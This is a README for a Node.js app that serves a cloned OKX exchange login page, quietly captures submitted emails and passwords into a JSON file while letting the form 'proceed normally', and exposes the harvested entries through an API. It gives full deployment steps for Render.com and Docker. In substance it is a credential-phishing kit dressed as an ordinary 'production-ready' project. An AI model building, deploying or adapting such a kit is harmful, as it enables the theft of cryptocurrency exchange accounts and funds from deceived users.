# OKX Login Form - Server & Deployment

A production-ready Node.js application that serves the OKX login form interface and captures form submissions.

## Features

- ✅ Serves static OKX login form UI (preserves all styling)
- ✅ Captures form submissions and stores data
- ✅ RESTful API endpoints for form data management
- ✅ Health check monitoring
- ✅ CORS enabled
- ✅ Production-ready with Docker
- ✅ Ready for Render.com deployment

## Installation

### Local Development

```bash
# Install dependencies
npm install

# Start development server
npm run dev

# Or start production server
npm start
```

The application will start on `http://localhost:3000`

## Project Structure

```
.
├── server.js                 # Main Express server
├── index.html               # OKX login form UI
├── form-handler.js          # Client-side form handler
├── package.json             # Dependencies and scripts
├── Dockerfile              # Docker containerization
├── render.yaml            # Render deployment config
├── .env.example           # Environment variables template
└── form-submissions.json  # Stores captured form data (auto-generated)
```

## API Endpoints

### Form Submission
**POST** `/api/submit-form`
- Content-Type: `application/json`
- Body: Form data (any structure)
- Returns: `{ success: true, id: number }`

Example:
```bash
curl -X POST http://localhost:3000/api/submit-form \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "password": "secretkey"}'
```

### View Submissions
**GET** `/api/submissions`
- Returns: `{ count: number, submissions: array }`

### Health Check
**GET** `/api/health`
- Returns: `{ status: "healthy", timestamp: "2026-03-20T..." }`

## Form Capture Feature

The `form-handler.js` script automatically:
1. Detects form elements on the page
2. Removes skeleton loading states  
3. Captures form data when submitted
4. Sends data to `/api/submit-form` endpoint
5. Allows form to proceed normally

**All existing styling and appearance is preserved.**

## Deployment to Render.com

### Prerequisites
- GitHub account with repository containing this code
- Render.com account

### Steps

1. **Push to GitHub**
```bash
git add .
git commit -m "Ready for deployment"
git push origin main
```

2. **Deploy on Render**
   - Go to https://dashboard.render.com
   - Click "New +" → "Web Service"
   - Connect your GitHub repository
   - Configure:
     - **Name:** okx-login-form
     - **Environment:** Node
     - **Build Command:** `npm install`
     - **Start Command:** `node server.js`
     - **Port:** 3000
   - Add environment variable: `NODE_ENV` = `production`
   - Click "Create Web Service"

3. **Access Your Deployment**
   - Your app will be live at: `https://<your-service-name>.onrender.com`
   - Form submissions endpoint: `https://<your-service-name>.onrender.com/api/submit-form`
   - View submissions: `https://<your-service-name>.onrender.com/api/submissions`

### Using Docker Locally

```bash
# Build image
docker build -t okx-login-form .

# Run container
docker run -p 3000:3000 okx-login-form

# Access at http://localhost:3000
```

### Using Docker with Render

1. Create account on Docker Hub
2. Build and push to Docker Hub:
```bash
docker build -t yourusername/okx-login-form .
docker push yourusername/okx-login-form
```

3. On Render dashboard:
   - Select "Docker" as environment
   - Specify image: `yourusername/okx-login-form`
   - Set port to 3000
   - Deploy

## Configuration

### Environment Variables

Create a `.env` file (optional):
```
NODE_ENV=production
PORT=3000
ENABLE_CORS=true
```

### Data Storage

Form submissions are stored in `form-submissions.json` (one entry per line).

## Troubleshooting

### Form still loading on startup
- The `form-handler.js` script retries up to 50 times
- Each retry waits 200ms
- Total wait time: up to 10 seconds
- Ensures form is fully loaded before enhancement

### No data being captured
- Check browser console for errors (F12 → Console)
- Verify `/api/submit-form` endpoint is accessible
- Ensure form submission happens after script loads

### Server won't start
- Verify Node.js 18+ is installed
- Check port 3000 is not in use
- Run: `npm install` to ensure dependencies

## Health Check

The server includes automated health monitoring:
- Endpoint: `/api/health`
- Interval: 30 seconds
- Timeout: 3 seconds
- Retries: 3 attempts

## Performance

- Minimal JavaScript footprint
- No external dependencies for form enhancement
- Efficient form data capture
- Scalable data storage

## Security Notes

- CORS is enabled for development; customize in production
- Form data is logged server-side
- No passwords are hashed (implement encryption if needed)
- Always use HTTPS in production

## Support & Issues

For form loading issues:
1. Check browser DevTools Network tab
2. Verify all JavaScript files are loading
3. Check `form-handler.js` console logs
4. Review form submission payloads

## License

MIT

## Version

1.0.0
